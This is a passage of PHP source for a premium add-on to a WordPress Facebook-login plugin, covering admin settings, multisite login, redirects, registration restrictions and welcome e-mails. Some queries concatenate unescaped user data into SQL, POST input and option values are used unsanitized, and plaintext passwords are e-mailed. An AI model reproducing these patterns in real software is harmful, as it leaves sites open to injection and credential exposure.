        <?php jfb_output_simple_lightbox("(Click for more info)", "The basic option to request user emails will prompt your visitors, but they can still hide their true addresses by using a Facebook proxy (click 'change' in the permissions dialog, and select 'xxx@proxymail.facebook.com').  This option performs a secondary check to enforce that they allow access to their REAL e-mail.  Note that the check requires several extra queries to Facebook's servers, so it could result in a slightly longer delay before the login initiates.")?><br /><br />
        
        <b>Wordbooker Avatar Integration:</b><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_wordbooker_integrate?>" value="1" <?php echo get_option($opt_jfbp_wordbooker_integrate)?'checked="checked"':''?> /> Use Facebook avatars for <a href="http://wordpress.org/extend/plugins/wordbooker/">Wordbooker</a>-imported comments
        <?php jfb_output_simple_lightbox("(Click for more info)", "The Wordbooker plugin allows you to push blog posts to your Facebook wall, and also to import comments on these posts back to your blog.  This option will display real Facebook avatars for imported comments, provided the commentor logs into your site at least once.")?><br /><br />
        
		<b>Autoregistered User Role:</b><br />
		<?php
		add_option($opt_jfbp_autoregistered_role, get_option('default_role'));
		$currSelection = get_option($opt_jfbp_autoregistered_role);
		$editable_roles = get_editable_roles();
		if ( empty( $editable_roles[$currSelection] ) ) $currSelection = get_option('default_role');
		?>
		Users who are autoregistered with Facebook will be created with the role: 
		<select <?php disableatt() ?> name="<?php echo $opt_jfbp_autoregistered_role?>" id="<?php echo $opt_jfbp_autoregistered_role?>">
			<?php wp_dropdown_roles( $currSelection ); ?>
		</select><br /><br />

        <b>Widget Appearance:</b><br />
        Please use the <a href="<?php echo admin_url('widgets.php') ?>" target="widgets">WP-FB AutoConnect <b><i>Premium</i></b> Widget</a> if you'd like to:<br />
        &bull; Customize the Widget's text <?php jfb_output_simple_lightbox("(Click for more info)", "You can customize the text of: User, Pass, Login, Remember, Forgot, Logout, Edit Profile, Welcome.")?><br />
        &bull; Show/Hide any of the Widget's links, checkboxes, or textfields  <?php jfb_output_simple_lightbox("(Click for more info)", "You can show or hide:<ul style='list-style-type:disc;list-style-position:inside;'><li>The User/Pass fields (leaving Facebook as the only way to login)</li><li>The 'Register' link (only applicable if registration is enabled on the site/network)</li><li>The 'Remember' tickbox</li><li>The 'Edit Profile' link</li><li>The 'Forgot Password' link</li></ul>")?><br />      
        &bull; Show the user's avatar next to their username (when logged in)<br />
		&bull; Point the "Edit Profile" link to the BP profile, rather than WP<br/>
		&bull; Point the "Forgot Password" link to a custom URL of your choosing<br />
        &bull; Allow the user to simultaneously logout of your site <i>and</i> Facebook<br /><br />
            
        <b>AJAX Spinner:</b><br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="0" <?php echo (get_option($opt_jfbp_show_spinner)==0?"checked='checked'":"")?> >Don't show an AJAX spinner<br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="1" <?php echo (get_option($opt_jfbp_show_spinner)==1?"checked='checked'":"")?> >Show a white AJAX spinner to indicate the login process has started (<img src=" <?php echo $jfb_data_url ?>/assets/spinner_white.gif" alt="spinner" />)<br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_show_spinner; ?>" value="2" <?php echo (get_option($opt_jfbp_show_spinner)==2?"checked='checked'":"")?> >Show a black AJAX spinner to indicate the login process has started (<img src=" <?php echo $jfb_data_url ?>/assets/spinner_black.gif" alt="spinner" />)<br /><br />
                
        <b>AutoRegistration Restrictions:</b><br />
        <?php add_option($opt_jfbp_restrict_reg_url, '/') ?>
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="0" <?php echo (get_option($opt_jfbp_restrict_reg)==0?"checked='checked'":"")?>>Open: Anyone can login (Default)<br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="1" <?php echo (get_option($opt_jfbp_restrict_reg)==1?"checked='checked'":"")?>>Closed: Only login existing blog users<br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="2" <?php echo (get_option($opt_jfbp_restrict_reg)==2?"checked='checked'":"")?>>Invitational: Only login users who've been invited via the <a href="http://wordpress.org/extend/plugins/wordpress-mu-secure-invites/">Secure Invites</a> plugin <?php jfb_output_simple_lightbox("(Click for more info)", "For invites to work, the connecting user's Facebook email must be accessible, and it must match the email to which the invitation was sent.")?><br />
		<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="3" <?php echo (get_option($opt_jfbp_restrict_reg)==3?"checked='checked'":"")?>>Friendship: Only login users who are friends with uid <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_uid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_uid) ?>" /> on Facebook <?php jfb_output_simple_lightbox("(Click for more info)", "To find your Facebook uid, login and view your Profile Pictures album.  The URL will be something like 'http://www.facebook.com/media/set/?set=a.123.456.789'.  In this example, your uid would be 789 (the numbers after the last decimal point).")?><br />
		<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="4" <?php echo (get_option($opt_jfbp_restrict_reg)==4?"checked='checked'":"")?>>Membership: Only login users who are members of group id <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_gid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_gid); ?>" /> on Facebook <?php jfb_output_simple_lightbox("(Click for more info)", "To find a groups's id, view its URL.  It will be something like 'http://www.facebook.com/group.php?gid=12345678'.  In this example, the group id would be 12345678.")?><br />
		<input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_restrict_reg; ?>" value="5" <?php echo (get_option($opt_jfbp_restrict_reg)==5?"checked='checked'":"")?>>Fanpage: Only login users who are fans of page id <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_restrict_reg_pid?>" value="<?php echo get_option($opt_jfbp_restrict_reg_pid); ?>" /> on Facebook <?php jfb_output_simple_lightbox("(Click for more info)", "To find a page's id, view one of its photo albums.  The URL will be something like 'http://www.facebook.com/media/set/?set=a.123.456.789'.  In this example, the id would be 789 (the numbers after the last decimal point).")?><br />
        Redirect URL for denied logins: <input <?php disableatt() ?> type="text" size="30" name="<?php echo $opt_jfbp_restrict_reg_url?>" value="<?php echo get_option($opt_jfbp_restrict_reg_url) ?>" /><br /><br />
                
        <b>Custom Redirects:</b><br />
        <?php add_option($opt_jfbp_redirect_new, "1"); ?>
        <?php add_option($opt_jfbp_redirect_existing, "1"); ?>
        <?php add_option($opt_jfbp_redirect_logout, "1"); ?>
        When a new user is autoregistered on your site, redirect them to:<br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_new; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_new)==1?"checked='checked'":"")?> >Default (refresh current page)<br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_new; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_new)==2?"checked='checked'":"")?> >Custom URL:
        <input <?php disableatt() ?> type="text" size="47" name="<?php echo $opt_jfbp_redirect_new_custom?>" value="<?php echo get_option($opt_jfbp_redirect_new_custom) ?>" /> <small>(Supports %username% variables)</small><br /><br />
        When an existing user returns to your site, redirect them to:<br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_existing; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_existing)==1?"checked='checked'":"")?> >Default (refresh current page)<br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_existing; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_existing)==2?"checked='checked'":"")?> >Custom URL:
        <input <?php disableatt() ?> type="text" size="47" name="<?php echo $opt_jfbp_redirect_existing_custom?>" value="<?php echo get_option($opt_jfbp_redirect_existing_custom) ?>" /> <small>(Supports %username% variables)</small><br /><br />
        When a user logs out of your site, redirect them to:<br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_logout; ?>" value="1" <?php echo (get_option($opt_jfbp_redirect_logout)==1?"checked='checked'":"")?> >Default (refresh current page)<br />
        <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_redirect_logout; ?>" value="2" <?php echo (get_option($opt_jfbp_redirect_logout)==2?"checked='checked'":"")?> >Custom URL:
        <input <?php disableatt() ?> type="text" size="47" name="<?php echo $opt_jfbp_redirect_logout_custom?>" value="<?php echo get_option($opt_jfbp_redirect_logout_custom) ?>" /><br /><br />

        <b>Welcome Message:</b><br />
        <?php add_option($opt_jfbp_notifyusers_content, "Thank you for logging into " . get_option('blogname') . " with Facebook.\nIf you would like to login manually, you may do so with the following credentials.\n\nUsername: %username%\nPassword: %password%"); ?>
        <?php add_option($opt_jfbp_notifyusers_subject, "Welcome to " . get_option('blogname')); ?>
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_notifyusers?>" value="1" <?php echo get_option($opt_jfbp_notifyusers)?'checked="checked"':''?> /> Send a custom welcome e-mail to users who register via Facebook <small>(*If we know their address)</small><br />
        <input <?php disableatt() ?> type="text" size="102" name="<?php echo $opt_jfbp_notifyusers_subject?>" value="<?php echo get_option($opt_jfbp_notifyusers_subject) ?>" /><br />
        <textarea <?php disableatt() ?> cols="85" rows="5" name="<?php echo $opt_jfbp_notifyusers_content?>"><?php echo get_option($opt_jfbp_notifyusers_content) ?></textarea><br /><br />

        <b>BuddyPress Activity Stream:</b><br />
        <?php add_option($opt_jfbp_bpstream_logincontent, "%user% logged in with Facebook"); ?>
        <?php add_option($opt_jfbp_bpstream_registercontent, "%user% registered with Facebook"); ?>
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpstream_register?>" value="1" <?php echo get_option($opt_jfbp_bpstream_register)?'checked="checked"':''?> /> When a new user autoconnects to your site, post to the BP Activity Stream:
        <input <?php disableatt() ?> type="text" size="50" name="<?php echo $opt_jfbp_bpstream_registercontent?>" value="<?php echo get_option($opt_jfbp_bpstream_registercontent) ?>" /><br />
		<input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpstream_login?>" value="1" <?php echo get_option($opt_jfbp_bpstream_login)?'checked="checked"':''?> /> When an existing user returns to your site, post to the BP Activity Stream:
        <input <?php disableatt() ?> type="text" size="50" name="<?php echo $opt_jfbp_bpstream_logincontent?>" value="<?php echo get_option($opt_jfbp_bpstream_logincontent) ?>" /><br /><br />
 
		<b>BuddyPress X-Profile Mappings</b><br />
		This section will let you automatically fill in your Buddypress users' X-Profile data from their Facebook profiles.<br />
		<small>&bull; Facebook fields marked with an asterisk (i.e. Birthday*) require the user to approve extra permissions during login.</small><br />
		<small>&bull; Some limitations exist regarding which X-Profile fields can be populated</small> <?php jfb_output_simple_lightbox("(Click for more info)", "Only 'Text Box,' 'Multi-Line Text Box,' and 'Date Selector'-type profile fields can be mapped at this time.  Due to unpredictability in matching freeform values from Facebook to pre-defined values on BuddyPress, support for dropdowns, radiobuttons, and checkboxes MAY be added in the future.")?><br />
		<small>&bull; Some limitations exist regarding which Facebook fields can be imported</small> <?php jfb_output_simple_lightbox("(Click for more info)", "Because some Facebook fields are formatted differently, each one needs to be explicitly implemented.  I've included an initial selection of fields (i.e. Name, Gender, Birthday, Bio, etc), but if you need another field to be available, please request it on the support page and I'll do my best to add it to the next update.")?><br /><br />
		
         <?php
         //If people report problems with Buddypress detection, use this more robust method: http://codex.buddypress.org/plugin-development/checking-buddypress-is-active/
         if( !function_exists('bp_has_profile') ) echo "<i>BuddyPress Not Found.  This section is only available on BuddyPress-enabled sites.</i>";
         else if ( !bp_has_profile() )            echo "Error: BuddyPress Profile Not Found.  This should never happen - if you see this message, please report it on the plugin support page.";
         else
         {
            //Present the 3 mapping options: disable mapping, map new users, or map new and returning users ?> 
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="0" <?php echo (get_option($opt_jfbp_xprofile_map)==0?"checked='checked'":"")?> >Disable Mapping
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="1" <?php echo (get_option($opt_jfbp_xprofile_map)==1?"checked='checked'":"")?> >Map New Users Only
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_xprofile_map; ?>" value="2" <?php echo (get_option($opt_jfbp_xprofile_map)==2?"checked='checked'":"")?> >Map New And Returning Users<br /><?php
            
            //Make a list of which Facebook fields may be mapped to each type of xProfile field.  Omitted types (i.e. checkbox) are treated as "unmappable."
            //The format is "xprofile_field_type"->"(fbfieldname1, fbfieldDisplayname1), (fbfieldname2, fbfieldDisplayname2), ..."
            //(Available FB fields are documented at: https://developers.facebook.com/docs/reference/api/user/)
            $allowed_mappings = array(
            	'textbox' =>array('id'=>"ID", 'name'=>"Name", 'first_name'=>"First Name", 'middle_name'=>"Middle Name", 'last_name'=>"Last Name",
            					  'username'=>"Username", 'gender'=>"Gender", 'link'=>"Profile URL", "website"=>"Website*", 'bio'=>"Bio*", 
            					  'political'=>"Political*", "religion"=>"Religion*", 'relationship_status'=>"Relationship*", "location"=>"City*",
            					  'hometown'=>"Hometown*", 'languages'=>"Languages*", 'music'=>'Music*', 'interests'=>'Interests*'),
                'textarea'=>array('id'=>"ID", 'name'=>"Name", 'first_name'=>"First Name", 'middle_name'=>"Middle Name", 'last_name'=>"Last Name", 
                				  'username'=>"Username", 'gender'=>"Gender", 'link'=>"Profile URL", "website"=>"Website*", 'bio'=>"Bio*",
                				  'political'=>"Political*", "religion"=>"Religion*", 'relationship_status'=>"Relationship*", "location"=>"City*", 
                				  'hometown'=>"Hometown*", 'languages'=>"Languages*", 'music'=>'Music*', 'interests'=>'Interests*'),
                'datebox' =>array('birthday'=>'Birthday*'));
			$allowed_mappings = apply_filters('wpfb_xprofile_allowed_mappings', $allowed_mappings);

            //Go through all of the XProfile fields and offer possible Facebook mappings for each (in a dropdown).
            //(current_mappings is used to set the initial state of the panel, i.e. based on what mappings are already in the db)
            $current_mappings = get_option($opt_jfbp_xprofile_mappings);
            while ( bp_profile_groups() )
            {
                //Create a "box" for each XProfile Group
                global $group;
                bp_the_profile_group();
                ?><div style="width:420px; padding:5px; margin:2px 0; background-color:#EEEDDA; border:1px solid #CCC;"><?php
                echo "Group \"$group->name\":<br />";
                
                //And populate the group box with Textarea(xprofile field)->Dropdown(possible facebook mappings)
                while ( bp_profile_fields() )
                {
                    //Output the X-Profile field textarea
                    global $field;
                    bp_the_profile_field();
                    ?><input disabled='disabled' type="text" size="20" name="<?php echo $field->name ?>" value="<?php echo $field->name; ?>" /> -&gt;
                    
                    <?php 
                    //If there aren't any available Facebook mappings, just put a disabled textbox and "hidden" field that sets this option as '0' 
                    if( !$allowed_mappings[$field->type] )
                    {
                        echo "<input disabled='disabled' type='text' size='30' name='$field->name"."_unavail"."' value='(No Mappings Available)' />";
                        echo "<input type='hidden' name='$field->id' value='0' />";
                        continue;
                    }
                    
                    //Otherwise, list all of the available mappings in a dropdown.
                    ?><select name="<?php echo $jfb_xprofile_field_prefix . $field->id?>">
                    	<option value="0">(No Mapping)</option><?php
                        foreach($allowed_mappings[$field->type] as $fbname => $userfriendlyname)
                            echo "<option " . ($current_mappings[$field->id]==$fbname?"selected":"") . " value=\"$fbname\">$userfriendlyname</option>";
    			    ?></select><br /><?php
                }
                ?></div><?php
            }
        }?>
                                        
        <input type="hidden" name="prem_opts_updated" value="1" />
        <div class="submit"><input <?php disableatt() ?> type="submit" name="Submit" value="Save Premium" /></div>
    </form>
    <?php    
}


/**********************************************************************/
/**********************************************************************/
/***************************USER MANAGEMENT****************************/
/**********************************************************************/
/**********************************************************************/


//Add a column to "Users" admin page (showing uid & Facebook link of AutoConnected users)
function jfb_p_fbid_column($column_headers) {
    $column_headers['fbid'] = 'Facebook';
    return $column_headers;
}
function jfb_p_fbid_custom_column($custom_column,$column_name,$user_id)
{
    if ($column_name=='fbid') 
    {
        $uid = get_user_meta($user_id, "facebook_uid", true);
        if($uid)
            $custom_column = "<a href='http://www.facebook.com/profile.php?id=$uid' target='fb'>$uid</a>";
    }
    return $custom_column;
}


/**********************************************************************/
/**********************************************************************/
/**********************VERSION CHECK/LOGGING***************************/
/**********************************************************************/
/**********************************************************************/

//Add a warning message to the admin panel if using an out-of-date core plugin version 
add_action('wpfb_admin_messages', 'jfb_check_premium_version');
function jfb_check_premium_version()
{
    global $jfb_version;
    if( version_compare($jfb_version, JFB_PREMIUM_REQUIREDVER) == -1 ): ?>
    <div class="error"><p><strong>Warning:</strong> The Premium addon requires WP-FB-AutoConnect <?php echo JFB_PREMIUM_REQUIREDVER ?> or newer to make use of all available features.  Please update your core plugin.</p></div>
    <?php endif;
}


//Add a note to login logs that we're using the premium addon
add_action('wpfb_prelogin', 'jfb_log_premium');
function jfb_log_premium()
{
    global $jfb_log;
    $jfb_log .= "PREMIUM: Premium Addon Detected (#" . JFB_PREMIUM . ", Version: " . JFB_PREMIUM_VER . ")\n"; 
}

//Add an HTML comment that we're using the premium addon
add_action('wpfb_after_button', 'jfb_report_premium_version');
function jfb_report_premium_version()
{
    echo "<!--Premium Add-On #" . JFB_PREMIUM . ", version " . JFB_PREMIUM_VER . "-->\n"; 
}


/**********************************************************************/
/**********************************************************************/
/***********************FEATURE IMPLEMENTATION*************************/
/**********************************************************************/
/**********************************************************************/


///////////////////////////////MultiSite Support////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
  * Add a blog_id variable to the login form, so we can pass it into _process_login.php
  */
function jfb_p_add_blogid()
{
    if(function_exists('is_multisite') && is_multisite())
    {
        global $blog_id;
        ?><input type="hidden" name="blog_id" id="blog_id" value="<?php echo $blog_id;?>" /><?php
    }
}

/**
  * When the login process begins, restore the blogid from the blog that initiated the login.
  */
function jfb_p_setup_blogid()
{
    if(function_exists('is_multisite') && is_multisite() && isset($_POST['blog_id']))
    {
        global $blog_id, $jfb_log;
        $jfb_log .= "PREMIUM: Restoring blogid " . $_POST['blog_id'] . " (from " . $blog_id . ")\n";
        switch_to_blog($_POST['blog_id']);
    }
}

/**
  * This function runs before process_login.php searches existing users for matching usermeta.  It searches
  * across all users of all blogs.
  */
function jfb_get_candidate_users($args)
{
    global $jfb_log, $wp_users, $wpdb, $jfb_uid_meta_name;
	$sql = "SELECT user_login,user_email,ID FROM {$wpdb->users} WHERE ID IN (SELECT user_id FROM {$wpdb->usermeta} WHERE `meta_key` = '$jfb_uid_meta_name' AND `meta_value` = '".$args['FB_ID']."')";
	$wp_users = $wpdb->get_results( $sql );
	$jfb_log .= "PREMIUM: Accessing users across all blogs in the network...\n";
}


/**
  * When we login, make sure to add the current user to the current blog
  * (aka autoregister existing users from this multisite install onto the current blog, which they may or may not already be a member of)
  */
function jfb_multisite_add_to_blog($args)
{
    global $blog_id, $jfb_log, $opt_jfbp_autoregistered_role;
	if( !is_user_member_of_blog($args['WP_ID']) )
	{
        $role = get_option($opt_jfbp_autoregistered_role);
        $jfb_log .= "PREMIUM: Added user to blog: \"" . get_blog_option($blog_id, 'blogname') . "\", Role: \"".$role."\"\n";
        add_existing_user_to_blog( array('user_id'=>$args['WP_ID'], 'role'=>$role) );
	}
    else
        $jfb_log .= "PREMIUM: User is already a member of blog \"" . get_blog_option($blog_id, 'blogname') . "\"\n";
}


////////////////////////////Custom Redirects////////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
  * Custom redirect for NEW (autoregistered) users 
  */
function jfb_redirect_newuser( $args )
{
    global $jfb_log, $redirectTo, $opt_jfbp_redirect_new_custom;
    $jfb_log .= "PREMIUM: Using custom redirect for autoregistered user: " . get_option($opt_jfbp_redirect_new_custom) . "\n";
    $redirectTo = str_replace("%username%", $args['WP_UserData']['user_login'], get_option($opt_jfbp_redirect_new_custom));
}

/**
  * Custom redirect for EXISTING users 
  */
function jfb_redirect_existinguser( $args )
{
    global $jfb_log, $redirectTo, $opt_jfbp_redirect_existing_custom;
    $jfb_log .= "PREMIUM: Using custom redirect for existing user: " . get_option($opt_jfbp_redirect_existing_custom) . "\n";
    $redirectTo = str_replace("%username%", $args['WP_UserData']->user_login, get_option($opt_jfbp_redirect_existing_custom));
}

/**
  * Custom redirect for LOGGING OUT users (uses the standard wordpress hook).
  */
function jfb_redirect_logout( $url )
{
    global $opt_jfbp_redirect_logout_custom;
    $url = remove_query_arg( 'redirect_to', $url );
    $url = add_query_arg('redirect_to', get_option($opt_jfbp_redirect_logout_custom), $url );
    return $url;
}

///////////////AutoRegistration Enable/Disable/Invitational/////////////////
////////////////////////////////////////////////////////////////////////////

/**
  * Autoregistration Option: Perform additional actions prior to inserting a new user 
  */
function jfb_registration_restrict($user_data, $args)
{
    global $jfb_log, $wpdb, $opt_jfbp_restrict_reg, $opt_jfbp_restrict_reg_url, $opt_jfbp_restrict_reg_uid, $opt_jfbp_restrict_reg_pid, $opt_jfbp_restrict_reg_gid;
    
    //Autoregistration DISABLED
    if( get_option($opt_jfbp_restrict_reg) == 1 )
    {
        $jfb_log .= "PREMIUM: Autoregistration is Disabled; redirecting to " . get_option($opt_jfbp_restrict_reg_url) . ".\n";
        header("Location: " . get_option($opt_jfbp_restrict_reg_url));
        j_mail("Facebook Login: Autoregistration Disabled");
        exit;
    }
    
    //Autoregistration INVITATIONAL
    else if( get_option($opt_jfbp_restrict_reg) == 2)
    {
        $result = $wpdb->get_results( "SELECT * FROM " . $wpdb->base_prefix . "invitations WHERE invited_email='" . $user_data['user_email'] . "'");
        if(is_array($result) && count($result) > 0)
            $jfb_log .= "PREMIUM: AutoRegistration Invitational: User " . $user_data['user_email'] . " has been invited; continuing login.\n";
        else
        {
            $jfb_log .= "PREMIUM: AutoRegistration Invitational: User " . $user_data['user_email'] . " not found in wp_invites; Redirecting to " . get_option($opt_jfbp_restrict_reg_url) . "\n";
            header("Location: " . get_option($opt_jfbp_restrict_reg_url));
            j_mail("Facebook Login: Autoregistration Invitational Denied");
            exit;
        }
    }
    
    //Autoregistration FRIENDSHIP
    else if( get_option($opt_jfbp_restrict_reg) == 3)
    {
        $my_uid = get_option($opt_jfbp_restrict_reg_uid);
        if( $my_uid == $args['FB_ID'])
            $areFriends = true;
        else
        {
            $friends = jfb_api_get("https://graph.facebook.com/me/friends/".$my_uid."?access_token=".$args['access_token']);
            $areFriends = (count($friends['data']) > 0);
        }
        if( $areFriends ) 
        {
            $jfb_log .= "PREMIUM: Autoregistration by friendship accepted (visitor " . $args['FB_ID'] . " is friends with " . $my_uid . ")\n";
        }
        else
        {
            $jfb_log .= "PREMIUM: AutoRegistration by friendship denied  (visitor " . $args['FB_ID'] . " is NOT friends with " . $my_uid . ")\n";
            header("Location: " . get_option($opt_jfbp_restrict_reg_url));
            j_mail("Facebook Login: Autoregistration Friendship Denied");
            exit;
        }
    }
    
    //Autoregistation GROUP.  NOTE that this requires on extended permission (requested below).
    else if( get_option($opt_jfbp_restrict_reg) == 4)
    {
        $gid = get_option($opt_jfbp_restrict_reg_gid);
        $membersList = jfb_api_get("https://graph.facebook.com/$gid/members?access_token=".$args['access_token']);
        $membersList = $membersList['data'];
        function in_array_recursive($needle, $haystack)
        {
            foreach ($haystack as $item)
            {
                if ($item === $needle || (is_array($item) && in_array_recursive($needle, $item))) return true;
            }
            return false;
        }
        if( in_array_recursive($args['FB_ID'], $membersList) ) 
        {
            $jfb_log .= "PREMIUM: Autoregistration by membership accepted (visitor " . $args['FB_ID'] . " is member of group " . $gid . ")\n";
        }
        else
        {
            $jfb_log .= "PREMIUM: AutoRegistration by membership denied  (visitor " . $args['FB_ID'] . " is NOT member of group " . $gid . ")\n";
            header("Location: " . get_option($opt_jfbp_restrict_reg_url));
            j_mail("Facebook Login: Autoregistration Membership Denied");
            exit;
        }
    }
    
    //Autoregistation FANPAGE.  NOTE that this requires an extended permission (requested below).
    else if( get_option($opt_jfbp_restrict_reg) == 5)
    {
        $pg_id = get_option($opt_jfbp_restrict_reg_pid);
        $likes = jfb_api_get("https://graph.facebook.com/me/likes/$pg_id?access_token=".$args['access_token']);
        if( count($likes['data']) > 0 ) 
        {
            $jfb_log .= "PREMIUM: Autoregistration by fanpage accepted (visitor " . $args['FB_ID'] . " is fan of page " . $pg_id . ")\n";
        }
        else
        {
            $jfb_log .= "PREMIUM: AutoRegistration by fanpage denied  (visitor " . $args['FB_ID'] . " is NOT fan of page " . $pg_id . ")\n";
            header("Location: " . get_option($opt_jfbp_restrict_reg_url));
            j_mail("Facebook Login: Autoregistration Fanpage Denied");
            exit;
        }
    }
    return $user_data;
}


/**
  * This is used to request extra permissions needed for some of the cases above. 
  */
function jfb_autoregister_extended_permissions($permissions)
{
    global $opt_jfbp_restrict_reg;
    if( get_option($opt_jfbp_restrict_reg) == 4)      $permissions .= ",user_groups";
    else if( get_option($opt_jfbp_restrict_reg) == 5) $permissions .= ",user_likes";
    return $permissions;
}

///////////////////////////E-Mail Notification//////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
 * Send a custom notification message to newly connecting users
 */
function jfb_notify_newuser( $args )
{
    global $jfb_log, $opt_jfbp_notifyusers_subject, $opt_jfbp_notifyusers_content;
    $userdata = $args['WP_UserData'];
    $jfb_log .= "PREMIUM: Sending new registration notification to " . $userdata['user_email'] . ".\n";
    $mailContent = get_option($opt_jfbp_notifyusers_content);
    $mailContent = str_replace("%username%", $userdata['user_login'], $mailContent);
    $mailContent = str_replace("%password%", $userdata['user_pass'], $mailContent);
    wp_mail($userdata['user_email'], get_option($opt_jfbp_notifyusers_subject), $mailContent);
}


///////////////////////////Additional Buttons///////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
 * Add another Login with Facebook button below the comment form
 */
function jfb_show_comment_button()
{
    $userdata = wp_get_current_user();
    if( !$userdata->ID )
    {
        echo '<div id="facebook-btn-wrap">';
        jfb_output_facebook_btn();
        echo "</div>";
    }
}


/**
 * Add another Login with Facebook button to wp-signup.php (only relevant on WPMU installations)
 */
function jfb_show_signupform_btn()
{
    if( is_user_logged_in() ) return;
	if( get_site_option( 'registration' ) == "none" ) return;
	
	echo "<div class=\"fbLoginWrap\">";
	jfb_output_facebook_btn();
	//Since this is called 1st, the wp_footer callback will be skipped and this redirect will take precedence
	jfb_output_facebook_callback('/');
	echo "</div>";
}
function jfb_add_signup_css()
{
    echo "<style type=\"text/css\">.fbLoginWrap{margin: 0 280px 5px 20px;text-align:center}</style>";
}


/**
 * Add another Login with Facebook button to wp-login.php (requires 4 separate filters).
 */
function jfb_show_loginform_btn_getredirect($arg)
{
    global $jfb_saved_redirect;
    $jfb_saved_redirect = $arg;
    return $arg;
}
function jfb_show_registerform_btn_getredirect($arg)
{
    global $jfb_saved_redirect;
    $jfb_saved_redirect = "/";
    return $arg;    
}
function jfb_show_loginform_btn_initbtn()
{
    echo '<div id="facebook-btn-wrap">';
    jfb_output_facebook_btn();
    jfb_output_facebook_init(false);
    echo "</div>";
}
function jfb_show_loginform_btn_outputcallback( $arg )
{
    //Unfortunately, the login_form hook runs inside the <form></form> tags, so we can't use that to output our form.
    //Instead, I use login_message, which is run before the wp-login.php form.  If this isn't wp-login, stop executing.
    if( strpos($_SERVER['SCRIPT_FILENAME'], 'wp-login.php') === FALSE ) return $arg;
    
    //Output the form
    global $jfb_saved_redirect;
    jfb_output_facebook_callback($jfb_saved_redirect);
    return $arg;
}
function jfb_show_loginform_btn_styles()
{
    //Enqueue jQuery
    wp_enqueue_script('jquery');
    
    //Output CSS so our form isn't visible.
    echo '<style type="text/css" media="screen">
		#wp-fb-ac-fm { width: 0; height: 0; margin: 0; padding: 0; border: 0; }
		</style>';
}


//Add a login button to the BP registration page
function jfb_bpregistration_button()
{
    //We don't need to checked for logged-in status, because the registration page is only accessible while logged out.
    echo '<div id="facebook-btn-wrap">';
    jfb_output_facebook_btn();
    echo "</div><br />";
}

//////////////////////////Button Size & Text////////////////////////////////
////////////////////////////////////////////////////////////////////////////

/*
 * This function is called by jfb_output_facebook_btn() in the free plugin.
 * It references the premium options to let us customize the button from the admin panel.
 */ 
function jfb_output_facebook_btn_premium_30($scope)
{
    global $opt_jfbp_buttonstyle, $opt_jfbp_buttonimg, $jfb_js_callbackfunc, $opt_jfbp_buttonsize, $opt_jfbp_buttontext;
    
    //Original-style (xfbml) buttons
    if(get_option($opt_jfbp_buttonstyle) == 0)
    {
        $attr = "";
        if( get_option($opt_jfbp_buttonsize) == 1 )     $attr = 'size="small"';
        else if( get_option($opt_jfbp_buttonsize) == 2 )$attr = 'v="2" size="small"';
        else if( get_option($opt_jfbp_buttonsize) == 3 )$attr = 'v="2" size="medium"';
        else if( get_option($opt_jfbp_buttonsize) == 4 )$attr = 'v="2" size="large"';
        else if( get_option($opt_jfbp_buttonsize) == 5 )$attr = 'v="2" size="xlarge"';
        
        ?><span class="fbLoginButton"><script type="text/javascript">//<!--
            document.write('<fb:login-button scope="<?php echo $scope;?>" <?php echo $attr;?> onlogin="<?php echo $jfb_js_callbackfunc;?>();"><?php echo get_option($opt_jfbp_buttontext);?></fb:login-button>');
        //--></script></span><?php
    }
        
    //New-style (image) buttons
    else
    { 
      ?><span class="fbLoginButton">
            <a class="wpfbac-button" href="javascript:void(0);" onClick="FB.login(function(resp){ if (resp.authResponse)<?php echo $jfb_js_callbackfunc?>(); }, {scope:'<?php echo $scope;?>'});"><img src="<?php echo get_option($opt_jfbp_buttonimg); ?>" alt="<?php echo $opt_jfbp_buttontext;?>" /></a>
        </span><?php
    }
}


/*
 * A stub, so in the unlikely event that someone tries to install this newer premium addon with pre-v3.0.0 free plugin,
 * the site frontend won't die.
 */
function jfb_output_facebook_btn_premium()
{
    return "";
}

  
/////////////////////////////Double-Logins//////////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
